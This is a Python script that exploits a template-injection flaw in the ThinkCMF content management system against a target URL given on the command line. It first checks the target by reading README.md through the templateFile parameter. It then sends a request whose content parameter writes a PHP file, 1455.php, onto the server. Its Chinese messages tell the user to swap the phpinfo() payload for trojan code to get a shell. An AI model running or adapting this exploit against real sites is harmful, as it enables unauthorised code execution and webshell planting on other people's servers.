# -*- coding: utf-8 -*-

from pyfiglet import Figlet
from optparse import OptionParser
import requests

def scan(original_url):

    test_url=original_url+'index.php?a=display&templateFile=README.md'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
    }
    response = requests.get(url=test_url, headers=headers)
    if(response.text[:9]=="## README"):
        print("存在漏洞，正在尝试中。。。")
        last_url = original_url + "index.php?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('1455.php','<?php phpinfo();?>')</php>"
        response = requests.get(url=last_url, headers=headers)
        print("请尝试浏览 " + original_url + "1455.php\ngetshell可将phpinfo()替换为木马内容")
    else:
        print("不存在漏洞")
        return


def main():
    f = Figlet(width=2000)
    print(f.renderText("ThinkCMF"))

    usage = "usage: xxx.py -t <target>"  # 帮助
    parser = OptionParser(usage=usage)
    parser.add_option("-t", "--target", type="string", dest="target", help="your target here")
    (options, args) = parser.parse_args()  # 获取选项和参数进行赋值
    target = options.target
    if(target==None):
        print("未输入目标，请重新运行")
        return
    scan(target)
    pass


if __name__ == '__main__':
    main()
